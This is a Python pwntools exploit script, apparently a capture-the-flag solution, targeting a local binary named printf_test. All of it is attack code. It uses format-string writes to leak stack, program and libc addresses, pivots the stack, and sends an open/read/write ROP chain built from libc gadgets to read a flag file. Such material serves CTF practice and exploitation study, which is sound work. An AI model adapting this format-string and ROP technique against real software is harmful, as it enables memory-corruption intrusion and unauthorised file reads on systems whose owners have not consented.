from pwn import *
import time
def calc(offset,value,formate="$hhn"):
	print("%"+str(value)+"c%"+str(offset)+formate)
	return "%"+str(value)+"c%"+str(offset)+formate+"\0"
def stack_piviot():
	for i in range(6):
		f.sendline(calc(10,(int(hex(stack_addr)[-2:],16)-0x18+i)&0xff))
		time.sleep(0.1)
		if i:
			f.sendline(calc(12,(int(hex(pro_addr)[-2-2*i:-2*i],16))&0xff))
		else:
			f.sendline(calc(12,(int(hex(pro_addr)[-2:],16))&0xff))
		time.sleep(0.1)
f=process("./printf_test")
f.recvuntil("0x")
stack_addr=int(f.recv(12),16)
success("stack_addr 0x%x"%stack_addr)
# reopen stdout
f.sendline(calc(6,(int(hex(stack_addr)[-2:],16)+0x18)&0xff))
time.sleep(0.1)
f.sendline(calc(10,int(hex(stack_addr)[-2:],16)))#6,12,16
time.sleep(0.1)
f.sendline(calc(6,(int(hex(stack_addr)[-2:],16)+0x18+1)&0xff))
time.sleep(0.1)
f.sendline(calc(10,int(hex(stack_addr)[-4:-2],16)))#6,12,16
time.sleep(0.1)
f.sendline(calc(12,0x20))#6,12,16
time.sleep(0.1)
f.sendline(calc(9,0x680,"$hn"))#6,12,16
time.sleep(0.1)
f.sendline(calc(12,0x70))
time.sleep(0.1)


# get libc pro address
f.sendline("\n%9$paaa\n%15$paaa\0")
pro_addr=int((f.recvuntil("aaa").strip("aaa"))[-12:],16)
success("pro_addr 0x%x"%pro_addr)
libc_addr=int(f.recvuntil("aaa").strip("aaa")[-12:],16)
success("libc_addr 0x%x"%libc_addr)

#start stack pivolit
f.sendline(calc(10,(int(hex(stack_addr-0x18)[-4:-2],16))&0xff))
time.sleep(0.1)
f.sendline(calc(6,(int(hex(stack_addr)[-2:],16)+0x18)&0xff))
time.sleep(0.1)
stack_piviot()
#open_read_write rop
libc_base=libc_addr+0x00007ffff79e4000-0x7ffff7a05b97
flag_addr=pro_addr
pro_base=pro_addr-0x202070
success("pro_base: %x"%pro_base)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
pop_rdi=libc_base+0x2155f
pop_rdx_rsi=libc_base+0x1306d9
payload = (p64(pop_rdi)+p64(flag_addr))*6+p64(pop_rdx_rsi)+p64(0)*2+p64(libc_base+libc.symbols['open'])+p64(pop_rdi)+p64(1)+p64(pop_rdx_rsi)+p64(60)+p64(pro_addr)+p64(libc_base+libc.symbols['read'])+p64(pop_rdi)+p64(2)+p64(pop_rdx_rsi)+p64(50)+p64(pro_addr)+p64(libc_base+libc.symbols['write'])
print len(payload)
#gdb.attach(f,"b* 0x0000555555554000+0x9fe\nb* 0x0000555555554000+0xb22")
f.sendline("d^3CTF\0".ljust(0x10,'\0')+"flag\0\0\0\0"+payload)
f.interactive()
